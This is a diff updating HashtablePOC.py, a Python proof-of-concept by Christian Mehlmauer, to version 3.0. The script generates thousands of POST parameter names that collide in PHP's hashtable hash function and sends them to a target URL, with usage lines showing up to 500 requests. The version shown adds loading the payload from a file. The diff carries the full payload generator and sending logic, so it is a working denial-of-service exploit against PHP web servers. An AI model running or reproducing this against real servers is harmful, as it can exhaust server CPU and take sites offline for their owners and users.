@@ -1,4 +1,4 @@
-'''
+"""
 This script was written by Christian Mehlmauer <FireFart@gmail.com>
 https://twitter.com/#!/_FireFart_
 
@@ -15,9 +15,10 @@ python HashtablePOC.py -u https://host/index.php -v -c 1 -w -o output
 python HashtablePOC.py -u https://host/index.php -v -c 500
 
 Changelog:
+v3.0: Load Payload from file
 v2.0: Added Support for https, switched to HTTP 1.1
 v1.0: Initial Release
-'''
+"""
 
 import socket
 import sys
@@ -35,9 +36,10 @@ def main():
     parser.add_argument("-w", "--wait", dest="wait", action="store_true", default=False, help="wait for Response")
     parser.add_argument("-c", "--count", dest="count", type=int, default=1, help="How many requests")
     parser.add_argument("-v", "--verbose", dest="verbose", action="store_true", default=False, help="Verbose output")
-    parser.add_argument("-f", "--file", dest="file", help="Save payload to file")
+    parser.add_argument("-s", "--save", dest="save", help="Save payload to file")
+    parser.add_argument("-p", "--payload", dest="payload", help="Save payload to file")
     parser.add_argument("-o", "--output", dest="output", help="Save Server response to file. This name is only a pattern. HTML Extension will be appended. Implies -w")
-    parser.add_argument('--version', action='version', version='%(prog)s 2.0')
+    parser.add_argument("--version", action="version", version="%(prog)s 3.0")
 
     options = parser.parse_args()
 
@@ -61,14 +63,21 @@ def main():
     if not path:
         path = "/"
 
-    print("Generating Payload...")
-    payload = generatePayload()
-    print("Payload generated")
-    if options.file:
-        f = open(options.file, 'w')
-        f.write(payload)
+    if not options.payload:
+        print("Generating Payload...")
+        payload = generatePayload()
+        print("Payload generated")
+        if options.save:
+            f = open(options.save, "w")
+            f.write(payload)
+            f.close()
+            print("Payload saved to %s" % options.save)
+    else:
+        f = open(options.payload, "r")
+        payload = f.read()
         f.close()
-        print("Payload saved to %s" % options.file)
+        print("Loaded Payload from %s" % options.payload)    
+
     print("Host: %s" % host)
     print("Port: %s" % str(port))
     print("path: %s" % path)
@@ -134,7 +143,7 @@ Content-Length: %s
                 print(header)
                 print
             if options.output:
-                f = open(options.output+str(i)+".html", 'w')
+                f = open(options.output+str(i)+".html", "w")
                 f.write("<!-- "+header+" -->\r\n"+content)
                 f.close()
 
@@ -151,7 +160,7 @@ def generatePayload():
     # Note: Default max POST Data Length in PHP is 8388608 bytes (8MB)
     
     # entries with collisions in PHP hashtable hash function 
-    a = {'0':'Ez', '1':'FY', '2':'G8', '3':'H'+chr(23), '4':'D'+chr(122+33)}
+    a = {"0":"Ez", "1":"FY", "2":"G8", "3":"H"+chr(23), "4":"D"+chr(122+33)}
     # how long should the payload be
     length = 7
     size = len(a)
@@ -160,10 +169,10 @@ def generatePayload():
     maxvalueint = int(math.floor(maxvaluefloat))
     for i in range (maxvalueint):
         inputstring = base_convert(i, size)
-        result = inputstring.rjust(length, '0')
+        result = inputstring.rjust(length, "0")
         for item in a:
             result = result.replace(item, a[item])
-        post += '' + urllib.quote(result) + '=&'
+        post += "" + urllib.quote(result) + "=&"
 
     return post;
 
@@ -179,7 +188,7 @@ def base_convert(num, base):
         num = num // base
         arr.append(alphabet[rem])
     arr.reverse()
-    return ''.join(arr)
+    return "".join(arr)
 
 if __name__ == "__main__":
     main()
